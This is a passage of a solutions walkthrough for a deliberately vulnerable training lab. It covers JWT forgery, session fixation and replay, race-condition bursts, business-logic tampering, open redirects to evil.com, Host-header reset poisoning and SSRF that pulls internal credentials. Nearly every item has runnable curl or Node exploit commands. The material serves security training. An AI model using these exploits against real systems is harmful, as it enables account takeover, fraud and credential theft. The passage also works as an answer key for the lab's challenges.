**Burp workflow:** In the Proxy, open GET /jwt/none and submit the form normally once, so you capture the POST /jwt/none request with its `token` field. Send that request to Repeater (Ctrl+R), then build your unsigned token (base64url of the none header, dot, base64url of the admin payload, dot, empty signature) in a Decoder tab and replace the `token` field value. Resend and watch the server accept a signatureless token.


**2. Weak HMAC Secret** – `PENTRIX{...}`

Grab the guest token from `/jwt/weak` and decode it to confirm `alg` is `HS256`.
The secret is the guessable default `secret123`. Forge an admin token offline:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'secret123', {algorithm:'HS256'}));"
```

Submit it at `/jwt/weak`.

Why it works: HS256 security rests entirely on the secret, and a weak secret can
be guessed, letting anyone mint validly signed tokens.

**Burp workflow:** Browse to GET /jwt/weak with Proxy on and copy the guest token from the page into a Decoder tab to confirm `alg` is HS256. Mint your admin token offline (signed with the weak secret), then intercept the POST /jwt/weak request in Proxy and send it to Repeater (Ctrl+R). Replace the `token` field with your forged token, resend, and the response shows admin accepted.


**3. SQL Injection in kid Lookup** – `PENTRIX{...}`

The server runs `SELECT key FROM jwt_keys WHERE kid='<kid from token>'` and
verifies your token with whatever key comes back. Inject through the `kid`
header so the query returns a key you chose:

```
node -e "
const jwt = require('jsonwebtoken');
const myKey = 'attackerkey1';
const kid = \"zzz' UNION SELECT '\" + myKey;
console.log(jwt.sign({user:'guest',role:'admin'}, myKey,
  {algorithm:'HS256', header:{kid}}));"
```

Submit the token at `/jwt/kid`.

Why it works: the interpolated `kid` lets you UNION in your own key, so the
server verifies your token against a secret you control.

**Burp workflow:** Open GET /jwt/kid and submit the form once to capture the POST /jwt/kid request with its `token` field. Craft a token whose `kid` header carries a UNION SELECT that makes the lookup query return your own chosen key, then send the POST to Repeater (Ctrl+R) and swap the `token` field for your token. Resend: the server now verifies your token against the attacker-controlled key, so it validates.


**4. Untrusted jku Key Server** – `PENTRIX{...}`

First publish your own key on the in-lab attacker key server. At
`/jwt/attacker-keys`, register kid `evil` with secret `evilsecret` (the page then
shows your JWKS URL, e.g. `http://<your-lab-address>/jwt/attacker-keys/jwks?kid=evil`).
Then mint a token whose `jku` header points at it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'evilsecret', {algorithm:'HS256',
  header:{kid:'evil', jku:'http://<your-lab-address>/jwt/attacker-keys/jwks?kid=evil'}}));"
```

Submit it at `/jwt/jku`. (Adjust the host/port in `jku` to match your run.)

Why it works: the verifier fetches any `jku` URL with no allowlist and trusts
the keys it finds, so pointing it at your own key server hands you the signing key.

**Burp workflow:** With Proxy on, open GET /jwt/attacker-keys and register kid `evil` with your secret, then read the page response in the Proxy response panel to copy your JWKS URL. Send the POST /jwt/jku request to Repeater (Ctrl+R) and replace the `token` field with a token whose `jku` header points at your JWKS URL and whose `kid` matches `evil`. Resend: the server fetches your key server URL and verifies the token against your published key.


**5. RS256 / HS256 Algorithm Confusion** – `PENTRIX{...}`

Copy the RSA public key from `/jwt/confusion-pubkey`. When the server sees
`alg: HS256` it uses the public key bytes as the HMAC secret, and the public key
is public. Sign an HS256 token with those bytes as the key:

```
node -e "
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
(async () => {
  const html = await (await fetch('http://<your-lab-address>/jwt/confusion-pubkey')).text();
  const pem = html.match(/<pre class="payload-body">([\s\S]*?)<\/pre>/)[1];
  console.log(jwt.sign({user:'guest',role:'admin'},
    crypto.createSecretKey(Buffer.from(pem)), {algorithm:'HS256'}));
})();"
```

Submit it at `/jwt/confusion`.

Why it works: the server confuses an asymmetric public key with a symmetric HMAC
secret, so the published public key becomes a valid signing key for HS256 tokens.

**Burp workflow:** Browse to GET /jwt/confusion-pubkey with Proxy on and copy the RSA public key PEM from the response panel. Send the POST /jwt/confusion request to Repeater (Ctrl+R), then in a Decoder tab sign an HS256 token using the public key bytes as the HMAC secret (the confusion you are exploiting) and replace the `token` field with it. Resend and the server accepts your token as if it were RSA-signed.


**6. Expiry Never Checked** – `PENTRIX{...}`

Copy the expired admin token shown on `/jwt/noexpiry` (it expired an hour ago)
and paste it into the form on the same page unchanged.

Why it works: the verifier passes `ignoreExpiration`, so the `exp` claim is
never enforced and a leaked old token replays forever.

**Burp workflow:** Open GET /jwt/noexpiry with Proxy on and copy the expired admin token shown on the page straight from the response panel. Intercept the POST /jwt/noexpiry request, send it to Repeater (Ctrl+R), and paste the expired token unchanged into the `token` field. Resend: because the verifier never enforces `exp`, the stale token replays as admin.


**7. Audience Not Validated** – `PENTRIX{...}`

Copy the partner token from `/jwt/aud`. It carries `"aud": "billing-service"` and
`role: admin`. Submit it at the same page's login form.

Why it works: the server verifies the signature but never checks the `aud`
claim, so a token minted for a different service is accepted here.

**Burp workflow:** With Proxy on, open GET /jwt/aud and copy the partner token from the response panel, noting its `aud` claim names a different service. Send the POST /jwt/aud/login request to Repeater (Ctrl+R) and put the partner token into the `token` field. Resend: the signature checks out and the `aud` claim is never validated, so a token minted for another service logs you in here.


**8. Default Key for Missing kid** – `PENTRIX{...}`

Tokens without a `kid` header fall back to the hardcoded default key `test`.
Sign a kid-less admin token with it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'test', {algorithm:'HS256'}));"
```

Submit it at `/jwt/kiddefault`.

Why it works: the missing-kid fallback uses a predictable hardcoded secret, so
anyone who guesses it can mint valid tokens without a `kid` at all.

**Burp workflow:** Open GET /jwt/kiddefault and submit the form once to capture the POST /jwt/kiddefault request in Proxy, then send it to Repeater (Ctrl+R). Sign an admin token with the hardcoded fallback secret and no `kid` header in your forged token, and replace the `token` field with it. Resend: the server falls back to the default key for the kid-less token and accepts it.

---


## session – Session Management

**1. Session Fixation** – `PENTRIX{...}`

1. Fix the session id before login. The preset endpoint sets
   `lab_sid=attacker123` in your cookie jar:
   ```bash
   curl -s -c jar -b jar http://<your-lab-address>/session/fixation/preset -o /dev/null
   ```
2. Log in as `admin` with that same jar, so the pre-login cookie rides along.
   The password is the current admin password (`admin123` on a fresh install;
   if the auth module's brute-force lab changed it, use the new one):
   ```bash
   curl -s -c jar -b jar --data-urlencode "username=admin" \
     --data-urlencode "password=<admin password>" \
     http://<your-lab-address>/session/fixation/login
   ```

The login response shows the flag and your cookie is still
`lab_sid=attacker123`: the id you chose before login is now an authenticated
admin session. Logging in without the preset step earns nothing, because the
server then issues a fresh id of its own.

Why it works: the server keeps the pre-login session id instead of regenerating
it at login, so an attacker-chosen id becomes the victim's authenticated session.

**Burp workflow:** Browse to the fixation console through Burp Proxy and click the "Set my session cookie to sid=attacker123" link. Find the preset request in Proxy HTTP history and read the Set-Cookie header to confirm the sid you chose. Then intercept the login POST to /session/fixation/login, send it to Repeater (Ctrl+R), keep the same lab_sid cookie attached, log in as admin, and compare the session id shown before and after login to confirm it never changed.


**2. Logout Does Not Destroy the Session** – `PENTRIX{...}`

```
curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  http://<your-lab-address>/session/logoutdemo/login -o /dev/null
curl -b jar http://<your-lab-address>/session/logoutdemo/logout -o /dev/null
curl -b jar http://<your-lab-address>/session/logoutdemo/secret
```

The secret page still opens after logout and shows the flag.

Why it works: logout only flips a flag on the server-side session instead of
deleting it, so the old cookie keeps working.

**Burp workflow:** Browse through Burp Proxy, log in as admin at /session/logoutdemo/login, and open GET /session/logoutdemo/secret. Send that secret request to Repeater (Ctrl+R) so you hold the working lab_sid cookie, then log out in your browser. Replay the captured secret request in Repeater with the old cookie and watch the admin page still open after logout.


**3. Predictable Session IDs** – `PENTRIX{...}`

```
curl -c jar http://<your-lab-address>/session/predictable
```

The page shows your id (e.g. `1000`) and the admin's id right after yours
(e.g. `1001`). Set the admin's value as your cookie and open the admin panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t1001\n') \
  http://<your-lab-address>/session/predictable/admin
```

(Replace `1001` with the admin id shown on your page.)

Why it works: session ids are sequential integers, so the admin's session id is
trivially guessable from your own.

**Burp workflow:** Visit /session/predictable through Burp Proxy and read your sid and the admin's sid (the next integer) in the page. Send the request for GET /session/predictable/admin to Repeater (Ctrl+R) and replace the lab_sid cookie with the admin's sid value, then re-send. If you want the mechanical version, send the admin panel request to Intruder (Ctrl+I) and sweep a small numeric range around your own sid as the lab_sid payload.


**4. Session ID in the URL** – `PENTRIX{...}`

Visit `/session/urldemo` (this also seeds the admin's visit), then read the
proxy log at `/session/urldemo/proxy-log` and find the admin's URL:

```
GET /session/urldemo/home?sid=9dd444934bd24bb3367d3dd5bb30f089
```

Open that URL verbatim:

```
curl "http://<your-lab-address>/session/urldemo/home?sid=<admin-sid-from-log>"
```

Why it works: putting the sid in the URL leaks it into logs, and anyone who can
read the proxy log can replay the admin's session.

**Burp workflow:** Visit /session/urldemo through Burp Proxy (this also seeds the admin's visit), then open the proxy log link shown on the page, GET /session/urldemo/proxy-log. Scan the log for the admin's URL with the sid query parameter, copy the full /session/urldemo/home?sid=... request into Repeater (Ctrl+R), and send it verbatim. You ride the admin's session without ever touching a cookie.


**5. Sessions Never Expire** – `PENTRIX{...}`

Open `/session/legacy-archive` and copy the decade-old admin session id. Set it
as your `lab_sid` cookie and visit the legacy panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<archived-sid>\n') \
  http://<your-lab-address>/session/legacy-admin
```

Why it works: sessions live for 10 years, so a stolen session from a decade ago
is still accepted.

**Burp workflow:** Browse to /session/legacy-archive through Burp Proxy and read the session archive table to find the decade-old admin session id. Send GET /session/legacy-admin to Repeater (Ctrl+R), set the Cookie header to lab_sid=<archived-sid>, and re-send. Since sessions here live for 10 years, the ancient sid is still accepted and the legacy panel opens.


**6. Session ID in Debug Log** – `PENTRIX{...}`

Open `/session/debug-log` and find the line `admin session started sid=<id>`.
Replay it as your cookie:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<sid-from-log>\n') \
  http://<your-lab-address>/session/leak-admin
```

Why it works: verbose debug logging writes live session ids to a readable log,
handing the admin's session to anyone who looks.

**Burp workflow:** Open /session/logleak through Burp Proxy, follow the link to the debug log viewer at /session/debug-log, and find the line "admin session started sid=...". Send the admin panel request GET /session/leak-admin to Repeater (Ctrl+R), set the lab_sid cookie to the sid you copied from the log, and re-send to open the admin panel with the leaked session.

---


## race – Race Conditions

All race state is kept per session, so every request in a challenge must share one session: the curl sequences below keep one cookie jar (`-c jar -b jar` on the reset, `-b jar` afterwards), and the Burp runs reuse the one captured session cookie. Firing the same commands without the jar gives every request a fresh session and the race can never land.

**1. Single-Use Coupon Redeemed Twice** – `PENTRIX{...}`
The coupon page redeems coupon RACE10 ($10 credit, one use). One click redeems it
once; twenty at the same instant redeem it many times:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/coupon/redeem
```
Reload `/race/coupon`: the one-use coupon shows several redemptions and the
credit is a multiple of $10. One of the responses contains the flag.
Why it works: the "already used?" check and the "mark used" write are separated
by an async pause, so parallel requests all read `used=false` before any write
lands (time-of-check to time-of-use).

**Burp workflow:** In Proxy, redeem the coupon once on `/race/coupon` and send the POST to `/race/coupon/redeem` to Intruder (Ctrl+I). Under Positions, keep the request as is, no payload needed for a static redeem, then launch the parallel burst (Intruder, 20 threads). One of the responses comes back with the flag and the coupon page shows several redemptions. First hit POST `/race/reset` in Repeater so the coupon is fresh before the burst.


**2. Double-Spend the Balance** – `PENTRIX{...}`
The wallet holds $100. Fire 20 parallel transfers of the full $100:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/transfer -d 'to=attacker&amount=100'
```
Reload `/race/transfer`: the balance is deep negative (e.g. -$1900) and the
ledger lists all 20 transfers. One of the responses contains the flag.
Why it works: every request passes the `balance >= amount` check against the
same starting balance before any debit is applied, so the wallet spends money it
never had.

**Burp workflow:** Proxy the transfer form and send POST `/race/transfer` to Intruder (Ctrl+I). Mark the `amount` field (and `to`, or leave `to` fixed) as a payload position and launch a parallel burst of about 20 identical requests of $100. Watch Repeater or Intruder results: the balance on `/race/transfer` drops deep negative and one response carries the flag. Reset with POST `/race/reset` first so every run starts from $100.


**3. Vote Counted Twice** – `PENTRIX{...}`
The poll allows one vote per name. Two votes for the same name, sent in
parallel, both get recorded:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/vote -d 'name=voter1'
```
Reload `/race/vote`: `voter1` has 2 votes. (Voting twice sequentially is correctly
rejected with "Already voted"; only the parallel pair races.)
Why it works: the duplicate-name check and the vote insert are separated by an
async pause, so both requests pass the check before either insert happens.

**Burp workflow:** In Proxy, cast a vote with `name=voter1` on POST `/race/vote` and send it to Intruder (Ctrl+I). Put the payload position on `name`, or just burst the same fixed request twice in parallel, 2 threads is enough. Reload `/race/vote` in the browser and `voter1` shows 2 votes. Compare with sending the same request sequentially in Repeater (Ctrl+R): the second one is rejected with "Already voted".


**4. Referral Bonus Claimed Twice** – `PENTRIX{...}`
Referral code REF2026 pays 50 points, claimable once. Claim it 10 times in
parallel:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 10 | xargs -P10 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/referral -d 'code=REF2026'
```
Reload `/race/referral`: claims and points are multiples of the single bonus.
Why it works: the "already claimed?" check races the claim write across the
async gap, so concurrent claims each see an unclaimed code.

**Burp workflow:** Proxy the claim and send POST `/race/referral` with `code=REF2026` to Intruder (Ctrl+I). No payload variation needed, just a parallel burst of around 10 threads of the identical request. Reload `/race/referral` and the claims and points show multiples of the single 50 point bonus. Reset first via POST `/race/reset` so the code is unclaimed.


**5. Duplicate Username Registration** – `PENTRIX{...}`
Usernames must be unique. Register the same name twice in parallel:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/register -d 'username=racer&password=hunter2'
```
Reload `/race/register`: two accounts named `racer` exist. (A sequential second
registration is correctly rejected with "Username taken".)
Why it works: the uniqueness check and the insert are separated by an async
pause, so both registrations pass the check before either row is inserted.

**Burp workflow:** In Proxy, register once and send POST `/race/register` to Intruder (Ctrl+I). Keep `username=racer` and the password fixed, launch a 2-thread parallel burst, no payload positions needed. Reload `/race/register` and two accounts named `racer` exist. Verify in Repeater (Ctrl+R) that the same request sent twice in a row fails the second time with "Username taken".


**6. Beat the AV Scan (TOCTOU)** – `PENTRIX{...}`
Uploads are served immediately but a simulated AV scan deletes each file 2
seconds later. Upload, then fetch within the window:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/upload -d 'filename=secret.txt&content=top+secret+lab+data'
curl -s -b jar http://<your-lab-address>/race/files/secret.txt
```
The second request returns the file content and the flag. Wait 3 seconds and
fetch again: `404: file not found`, the scan deleted it.
Why it works: the file is servable the instant it is stored while the delete
only runs later, a classic time-of-check to time-of-use gap between "stored" and
"scanned".

**Burp workflow:** This one is Repeater (Ctrl+R), not Intruder. Send POST `/race/upload` with `filename` and `content` fields, then immediately (within about 2 seconds) send GET `/race/files/secret.txt` in a second Repeater tab. The fetch returns the file content with the flag. Wait 3 seconds, fetch again, and you get `404: file not found` because the simulated AV scan deleted it. To retry, just upload a fresh filename.


**7. Burst Through the Rate Limit** – `PENTRIX{...}`
The API allows 5 requests per window. The counter increments only after an async
gap, so a parallel burst all reads the old counter:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/ratelimit/hit
```
Reload `/race/ratelimit`: far more than 5 requests were counted as allowed in
one window. (Clicking sequentially stops at 5 with a 429, as intended.)
Why it works: the "under the limit?" check runs before the async pause and the
increment after it, so every request in the burst passes the check against a
stale counter.

**Burp workflow:** Proxy any API hit and send POST `/race/ratelimit/hit` to Intruder (Ctrl+I). The request has no variable fields, so launch a 20-thread parallel burst of identical requests. Reload `/race/ratelimit` in the browser: far more than 5 requests were counted as allowed in the window. Compare with Repeater (Ctrl+R) hits sent one at a time, which stop at 5 with a 429. Hit POST `/race/reset` first for a clean window.


**8. Oversell the Stock** – `PENTRIX{...}`
Only 5 gadgets in stock. Order 5 twice, in parallel:
```
curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/stock/buy -d 'qty=5'
```
Reload `/race/stock`: 10 items sold from stock of 5, stock shows -5.
Why it works: the stock check and the decrement are separated by an async
pause, so both orders see the pre-sale stock of 5 and both go through.

**Burp workflow:** In Proxy, order 5 gadgets and send POST `/race/stock/buy` with `qty=5` to Intruder (Ctrl+I). Launch just a 2-thread parallel burst of the identical request. Reload `/race/stock`: 10 items sold from a stock of 5, stock shows -5. Reset with POST `/race/reset` before each run so you start from the 5-item stock.


---
---


## bizlogic – Business Logic Flaws

**1. Negative Quantity Credit** – `PENTRIX{...}`
The checkout computes `$50 x qty` with no validation. Order -1 hoodies:
```
POST /bizlogic/negative-qty
qty=-1
```
Order total is -$50, so "charging" it credits the balance: $100 becomes $150
and the flag is awarded.
Why it works: a negative quantity turns the total negative, and subtracting a
negative total adds money instead of taking it.

**Burp workflow:** With Proxy intercepting, submit the checkout form at /bizlogic/negative-qty and catch the POST. Send it to Repeater (Ctrl+R), flip the qty field to a negative value like -1, and resend. The order total turns negative, so "charging" it credits your balance instead of debiting it.


**2. Client-Side Price Tampering** – `PENTRIX{...}`
The buy form carries the price in a hidden field (`price=50`) and the server
charges whatever the browser sends:
```
POST /bizlogic/price-tamper/buy
product_id=hoodie&price=1
```
The $50 hoodie is bought for $1.00.
Why it works: the price is taken from client input and never re-checked against
the product catalog, so any submitted price is honored.

**Burp workflow:** Intercept the buy POST to /bizlogic/price-tamper/buy in the Proxy and send it to Repeater (Ctrl+R). Change the price field (a hidden form field the server trusts) to a tiny value and resend. The server charges whatever price the browser sent, never re-checking the catalog, so the $50 hoodie goes for your price.


**3. Coupon Stacking Past 100%** – `PENTRIX{...}`
Three coupons are each "one per order": SAVE50, SAVE40, SAVE30. The discount
math adds every valid code with no cap:
```
POST /bizlogic/coupon-stack
codes=SAVE50,SAVE40,SAVE30
```
Total discount is 120%, the $50 hoodie costs -$10, and the shop pays you.
Why it works: percentages stack additively without a 100% ceiling, so combined
coupons drive the total at or below zero.

**Burp workflow:** Submit the coupon form once with Proxy on, then send the POST /bizlogic/coupon-stack request to Repeater (Ctrl+R). The codes field takes several codes separated by commas or spaces, so stack SAVE50, SAVE40 and SAVE30 in one replay. The discounts add up past 100%, the total drops to zero or below, and the shop owes you money.


**4. OTP Verified by JavaScript** – `PENTRIX{...}`
The page JavaScript checks the OTP and sets a hidden `otp_ok=1` field; the
server only looks at that field. Skip the JavaScript entirely:
```
POST /bizlogic/otp/verify
otp=000000&otp_ok=1
```
The order is confirmed with a wrong OTP. (Entering the real demo code 739184
through the form also works but awards nothing.)
Why it works: verification happens in the browser, which the attacker controls;
the server trusts the client-supplied `otp_ok` flag instead of checking the code
itself.

**Burp workflow:** Submit a wrong OTP on /bizlogic/otp with Proxy on, find the POST to /bizlogic/otp/verify in HTTP history, and send it to Repeater (Ctrl+R). Set the otp_ok hidden field to 1 while keeping a wrong otp value, then resend. The server only checks the client-supplied flag, so the order confirms without the real code (the page JavaScript never runs on the server).


**5. Checkout Step Skipped** – `PENTRIX{...}`
Checkout is cart, then payment, then confirm, but each step is just an endpoint
and confirm never verifies payment ran. Add to cart, then confirm directly:
```
POST /bizlogic/workflow/cart
product_id=hoodie

POST /bizlogic/workflow/confirm
```
The order is confirmed with "Payment step completed: false": a free hoodie.
Why it works: the confirm handler enforces no ordering of the workflow steps,
so the payment step can be skipped by calling the endpoint directly.

**Burp workflow:** Add the hoodie to the cart through the normal form at /bizlogic/workflow with Proxy on, so the session holds a cart. Skip the payment step entirely: build or capture a POST to /bizlogic/workflow/confirm and send it straight from Repeater (Ctrl+R). The confirm handler never verifies that payment ran, so the order confirms with "Payment step completed: false".


**6. Currency Confusion** – `PENTRIX{...}`
The $50 total is denominated in USD, but the server accepts any currency label
for that number and converts at face value:
```
POST /bizlogic/currency/pay
amount=50&currency=JPY
```
The $50 order settles as 50 JPY (about $0.34).
Why it works: a USD-denominated amount is accepted under a foreign currency
label with no real conversion, so the buyer chooses the cheapest currency.

**Burp workflow:** Submit the payment form at /bizlogic/currency with Proxy intercepting and send the POST /bizlogic/currency/pay to Repeater (Ctrl+R). Change the currency field from USD to a weak currency like JPY while keeping amount at 50, then resend. The server accepts any currency label for the USD-denominated amount and converts at face value, so a $50 order settles for a fraction of the price.


**7. Email Change Without Re-Authentication** – `PENTRIX{...}`
The account email can be changed with no password confirmation, and
forgot-password sends the reset link to whatever address is on file:
```
POST /bizlogic/account/email
new_email=attacker@evil.com

POST /bizlogic/account/forgot
email=attacker@evil.com
```
The response shows the reset link (demo mode displays it). Open it and set a
new password: full account takeover, flag awarded.
Why it works: changing the email needs no re-authentication, so the attacker
reroutes the account's recovery channel to themselves and resets the password.

**Burp workflow:** Open the shop account page with Proxy on and send the email-change POST to /bizlogic/account/email to Repeater (Ctrl+R), then change new_email to an address you control and resend. Next, send the POST to /bizlogic/account/forgot to Repeater, ask for a reset for that new address, and read the demo-mode reset link from the response. The reset link follows the account's email, so you can open it and set a fresh password: full account takeover, no re-authentication ever asked.


**8. Tampered Refund Amount** – `PENTRIX{...}`
Buy the $50 hoodie, then refund it. The refund form carries the amount in a
hidden field that the server never clamps to what was paid:
```
POST /bizlogic/refund/buy
product_id=hoodie

POST /bizlogic/refund
order_id=1&amount=5000
```
$5000 is refunded on a $50 order; the balance jumps accordingly.
Why it works: the refund amount is trusted from client input instead of being
looked up from the order, so any amount can be refunded.

**Burp workflow:** Buy the $50 hoodie on /bizlogic/refund with Proxy on and note the order id from the response or history. Submit the refund form once, send that POST to Repeater (Ctrl+R), and raise the hidden amount field far above what you paid, keeping the same order_id. The server trusts the client-supplied amount instead of looking up the order total, so the refund credits your balance with the inflated figure.

---


## redirect - Open Redirect

**1. Protocol-Relative Redirect** - `PENTRIX{...}`

```bash
curl -i "http://<your-lab-address>/redirect/go?next=//evil.com"
# HTTP/1.1 302 Found
# Location: //evil.com
```

Why it works: the `next` parameter is passed to the redirect with zero
validation, and a URL starting with `//` keeps the current scheme but navigates
to the attacker's host.

**Burp workflow:** In the Proxy, browse to `/redirect/go?next=/home` and intercept the request, then send it to Repeater (Ctrl+R). Change the `next` value to start with a protocol-relative host and re-send: watch the response for a 302 with your host in the `Location` header. The flag page follows the redirect destination, so proving the host swap is what matters, not clicking through.


**2. javascript: Scheme Honored** - `PENTRIX{...}`

```bash
curl -i "http://<your-lab-address>/redirect/js?next=javascript:alert(1)"
# HTTP/1.1 302 Found
# Location: javascript:alert(1)
```

Why it works: the endpoint sets the `Location` header from user input with no
scheme allowlist, so a `javascript:` URL is honored verbatim.

**Burp workflow:** Proxy an intercept on `/redirect/js?next=javascript:...` and throw it into Repeater. There is no scheme allowlist here, so your job is to swap the `next` parameter through a few schemes (`https:`, `javascript:`, `data:`) and read each `Location` header in the response. Whichever scheme gets reflected verbatim into `Location` is the one the lab treats as the exploit, so document which one worked.


**3. data: Scheme Honored** - `PENTRIX{...}`

```bash
curl -i "http://<your-lab-address>/redirect/data?next=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
# HTTP/1.1 302 Found
# Location: data:text/html,<script>alert(1)</script>
```

Why it works: same missing scheme check as lab 2; a `data:text/html` URL
smuggles a whole attacker-controlled document through the redirect.

**Burp workflow:** Intercept a request to `/redirect/data?next=data:text/html,...` in the Proxy and send it to Repeater. Iterate on the `next` parameter: try different `data:` prefixes and URL-encoded variants, re-sending each time and checking the 302 `Location` header. You are confirming the server embeds your attacker-controlled content inside the `Location` value without any validation, which is the whole vulnerability.


**4. Backslash Allowlist Bypass** - `PENTRIX{...}`

```bash
curl -i "http://<your-lab-address>/redirect/trusted?next=https:%5C%5Cevil.com"
# HTTP/1.1 302 Found
# Location: https:\\evil.com
```

(`%5C` is a URL-encoded backslash, so the payload is `https:\\evil.com`.)
A plain `?next=https://evil.com` is rejected with 400, proving the check runs.

Why it works: the naive allowlist compares the raw string prefix instead of the
parsed hostname and accepts backslash as a separator, while browsers and the
URL parser normalize `\` to `/`, so the real destination is evil.com.

**Burp workflow:** Start by proxying `/redirect/trusted?next=https://evil.com` and sending it to Repeater; the 400 rejection is your proof the naive allowlist check actually runs. Then swap in backslash variants of the host (URL-encoded `%5C`) and re-send, watching for the response to flip from 400 to a 302 whose `Location` carries the normalized destination. Use Intruder (Ctrl+I) on the `next` parameter with a small list of slash/backslash mixes to find the one the server parses differently than the check does.


**5. Parameter Pollution Picks Last** - `PENTRIX{...}`

```bash
curl -i "http://<your-lab-address>/redirect/polluted?next=safe&next=https://evil.com"
# HTTP/1.1 302 Found
# Location: https://evil.com
```

Why it works: with duplicate `next` parameters the code silently honors the
last value; the first one is only camouflage for anyone reviewing the link.

**Burp workflow:** In the Proxy, browse to `/redirect/polluted?next=safe` and send the request to Repeater. Duplicate the `next` parameter in the query string so you have a safe value and an attacker value side by side, then re-send and read the 302 `Location` header to see which one won. Try swapping the order and adding more copies; the lab honors one specific position, and finding it is the exercise.

---


## hostheader - Host Header Injection

**1. Password Reset Poisoning** - `PENTRIX{...}`

```bash
B=http://<your-lab-address>
# attacker requests a reset for the victim with a poisoned Host header
TOKEN=$(curl -s -H "Host: evil.com" --data "email=alice@pentrix.lab" \
  "$B/hostheader/forgot" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
# the emailed link now points at evil.com; victim "clicks" it -> token harvested
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: the reset link is built from the untrusted `Host` header, so the
victim's valid token is delivered to the attacker's domain.

**Burp workflow:** Submit the forgot-password form for email=alice@pentrix.lab and intercept the POST to `/hostheader/forgot` in Proxy. Send it to Repeater (Ctrl+R), change the `Host` header to `evil.com`, and resend: the response contains a reset link built with your poisoned host, so the token is issued to the attacker's domain. Then GET `/hostheader/evil-collect?token=<value>` in Repeater with the returned token to play the victim clicking the link, which is the harvest step the challenge checks.


**2. Cache Poisoning via Host** - `PENTRIX{...}`

```bash
B=http://<your-lab-address>
# step 1: poison the cache (page is keyed by path only, not by host)
curl -s -H "Host: evil.com" "$B/hostheader/app" -o /dev/null
# step 2: visit as a normal user -> served the poisoned page -> flag
curl -s "$B/hostheader/app" | grep -o "PENTRIX{[^}]*}"
# cleanup for repeat runs
curl -s "$B/hostheader/app/clear" -o /dev/null
```

Why it works: the portal page is cached by path alone, so the copy rendered
under the attacker's `Host` is served to every later visitor.

**Burp workflow:** Intercept a plain GET to `/hostheader/app` in Proxy and notice the page renders your `Host` value into the body but the cache is keyed by path only, not by host. Send it to Repeater (Ctrl+R), set `Host: evil.com`, and send once: this poisons the cached copy with the attacker's content. Now send the same request again with the normal host (or refresh in your proxied browser): the response comes back already containing the attacker's copy, which is the poisoning taking effect. Clean up between runs with a GET to `/hostheader/app/clear` in Repeater.


**3. SSRF via Host Header** - `PENTRIX{...}`

```bash
curl -s -H "Host: 127.0.0.1:13919" http://<your-lab-address>/hostheader/status \
  | grep -o "PENTRIX{[^}]*}"
# the page also prints the exfiltrated JSON: db_password, admin_api_key
```

Why it works: the server-side health check builds its fetch URL from the `Host`
header, so pointing it at `127.0.0.1:13919` makes the server fetch the
loopback-only internal monitoring agent and return its secrets.

**Burp workflow:** Intercept a GET to `/hostheader/status` in Proxy: this server-side health check builds its backend fetch URL from the incoming `Host` header. Send it to Repeater (Ctrl+R), change `Host` to `127.0.0.1:13919`, and send: the server now fetches the loopback-only internal monitoring agent and prints the exfiltrated JSON (`db_password`, `admin_api_key`) straight into the response body, flag included. The lesson is that one editable header turned a status page into an SSRF into internal infrastructure.


**4. X-Forwarded-Host Poisoning** - `PENTRIX{...}`

```bash
B=http://<your-lab-address>
TOKEN=$(curl -s -H "X-Forwarded-Host: evil.com" --data "email=bob@pentrix.lab" \
  "$B/hostheader/forgot-xfwd" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: behind a proxy this reset page trusts `X-Forwarded-Host` over
`Host`; same poisoning, different header.

**Burp workflow:** Run the same password reset flow as challenge 1, but this time on `/hostheader/forgot-xfwd` with email=bob@pentrix.lab. Intercept the POST in Proxy, send it to Repeater (Ctrl+R), and instead of touching `Host`, add or edit the `X-Forwarded-Host` header to `evil.com` and resend. This page trusts `X-Forwarded-Host` over `Host` (the behind-a-proxy case), so the reset link is built with the attacker's domain again. Harvest the token through `/hostheader/evil-collect?token=<value>` the same way as before.

Note: there is no separate route for the vendor-specific variant. The same `/hostheader/forgot-xfwd` handler also honors the `X-Host-Override` header, so repeat the Repeater steps above with `X-Host-Override: evil.com` (keeping a plain `Host`) and watch the override win. Fuzz every host-like header, not just `Host`.

**5. Absolute Continue URL** - `PENTRIX{...}`

```bash
curl -i -H "Host: evil.com" --data "username=alice&password=alice123" \
  http://<your-lab-address>/hostheader/login
# HTTP/1.1 302 Found
# Location: http://evil.com/hostheader/dashboard
```

(Demo accounts: alice/alice123, bob/bob123.)

